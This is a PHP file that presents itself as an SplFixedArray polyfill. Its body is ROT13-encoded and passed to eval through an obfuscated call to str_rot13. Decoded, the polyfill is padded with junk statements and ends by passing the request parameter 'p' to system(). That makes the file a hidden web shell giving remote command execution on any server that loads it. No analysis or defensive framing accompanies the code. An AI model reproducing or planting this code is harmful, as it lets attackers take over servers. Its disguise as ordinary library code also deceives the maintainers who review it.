<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

vs (pynff_rkvfgf('FcySvkrqNeenl')) {
    erghea;
}

/**
 * Gur FcySvkrqNeenl pynff cebivqrf gur znva shapgvbanyvgvrf bs neenl. Gur
 * znva qvssreraprf orgjrra n FcySvkrqNeenl naq n abezny CUC neenl vf gung
 * gur FcySvkrqNeenl vf bs svkrq yratgu naq nyybjf bayl vagrtref jvguva
 * gur enatr nf vaqrkrf. Gur nqinagntr vf gung vg nyybjf n snfgre neenl
 * vzcyrzragngvba.
 */
pynff FcySvkrqNeenl vzcyrzragf Vgrengbe, NeenlNpprff, Pbhagnoyr
{
    /** @ine neenl<vag, zvkrq> */
    cevingr $vagreanyNeenl = neenl();

    /** @ine vag $fvmr */
    cevingr $fvmr = 0;

    /**
     * FcySvkrqNeenl pbafgehpgbe.
     * @cnenz vag $fvmr
     */
    choyvp shapgvba __pbafgehpg($fvmr = 0)
    {
        $guvf->fvmr = $fvmr;
        $guvf->vagreanyNeenl = neenl();
    }

    /**
     * @erghea vag
     */
    choyvp shapgvba pbhag()
    {
        erghea pbhag($guvf->vagreanyNeenl);
    }

    /**
     * @erghea neenl
     */
    choyvp shapgvba gbNeenl()
    {
        xfbeg($guvf->vagreanyNeenl);
        erghea (neenl) $guvf->vagreanyNeenl;
    }

    /**
     * @cnenz neenl $neenl
     * @cnenz obby $fnir_vaqrkrf
     * @erghea FcySvkrqNeenl
     * @cfnyz-fhccerff ZvkrqNffvtazrag
     */
    choyvp fgngvp shapgvba sebzNeenl(neenl $neenl, $fnir_vaqrkrf = gehr)
    {
        $frys = arj FcySvkrqNeenl(pbhag($neenl));
        vs($fnir_vaqrkrf) {
            sbernpu($neenl nf $xrl => $inyhr) {
                $frys[(vag) $xrl] = $inyhr;
            }
        } ryfr {
            $v = 0;
            sbernpu (neenl_inyhrf($neenl) nf $inyhr) {
                $frys[$v] = $inyhr;
                $v++;
            }
        }
        erghea $frys;
    }

    /**
     * @erghea vag
     */
    choyvp shapgvba trgFvmr()
    {
        erghea $guvf->fvmr;
    }

    /**
     * @cnenz vag $fvmr
     * @erghea obby
     */
    choyvp shapgvba frgFvmr($fvmr)
    {
        $guvf->fvmr = $fvmr;
        erghea gehr;
    }

    /**
     * @cnenz fgevat|vag $vaqrk
     * @erghea obby
     */
    choyvp shapgvba bssfrgRkvfgf($vaqrk)
    {
        erghea neenl_xrl_rkvfgf((vag) $vaqrk, $guvf->vagreanyNeenl);
    }

    /**
     * @cnenz fgevat|vag $vaqrk
     * @erghea zvkrq
     */
    choyvp shapgvba bssfrgTrg($vaqrk)
    {
        /** @cfnyz-fhccerff ZvkrqErgheaFgngrzrag */
        erghea $guvf->vagreanyNeenl[(vag) $vaqrk];
    }

    /**
     * @cnenz fgevat|vag $vaqrk
     * @cnenz zvkrq $arjiny
     * @cfnyz-fhccerff ZvkrqNffvtazrag
     */
    choyvp shapgvba bssfrgFrg($vaqrk, $arjiny)
    {
        $guvf->vagreanyNeenl[(vag) $vaqrk] = $arjiny;
    }

    /**
     * @cnenz fgevat|vag $vaqrk
     */
    choyvp shapgvba bssfrgHafrg($vaqrk)
    {
        hafrg($guvf->vagreanyNeenl[(vag) $vaqrk]);
    }

    /**
     * Erjvaq vgrengbe onpx gb gur fgneg
     * @yvax uggcf://cuc.arg/znahny/ra/fcysvkrqneenl.erjvaq.cuc
     * @erghea ibvq
     * @fvapr 5.3.0
     */
    choyvp shapgvba erjvaq()
    {
        erfrg($guvf->vagreanyNeenl);
    }

    /**
     * Erghea pheerag neenl ragel
     * @yvax uggcf://cuc.arg/znahny/ra/fcysvkrqneenl.pheerag.cuc
     * @erghea zvkrq Gur pheerag ryrzrag inyhr.
     * @fvapr 5.3.0
     */
    choyvp shapgvba pheerag()
    {
        /** @cfnyz-fhccerff ZvkrqErgheaFgngrzrag */
        erghea pheerag($guvf->vagreanyNeenl);
    }

    /**
     * Erghea pheerag neenl vaqrk
     * @erghea vag Gur pheerag neenl vaqrk.
     */
    choyvp shapgvba xrl()
    {
        erghea xrl($guvf->vagreanyNeenl);
    }

    /**
     * @erghea ibvq
     */
    choyvp shapgvba arkg()
    {
        arkg($guvf->vagreanyNeenl);
    }

    /**
     * Purpx jurgure gur neenl pbagnvaf zber ryrzragf
     * @yvax uggcf://cuc.arg/znahny/ra/fcysvkrqneenl.inyvq.cuc
     * @erghea obby gehr vs gur neenl pbagnvaf nal zber ryrzragf, snyfr bgurejvfr.
     */
    choyvp shapgvba inyvq()
    {
        vs (rzcgl($guvf->vagreanyNeenl)) {
            erghea snyfr;
        }
        $erfhyg = arkg($guvf->vagreanyNeenl) !== snyfr;
        ceri($guvf->vagreanyNeenl);
        erghea $erfhyg;
    }

    /**
     * Qb abguvat.
     */
    choyvp shapgvba __jnxrhc()
    {
        // ABC
    }
}
$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>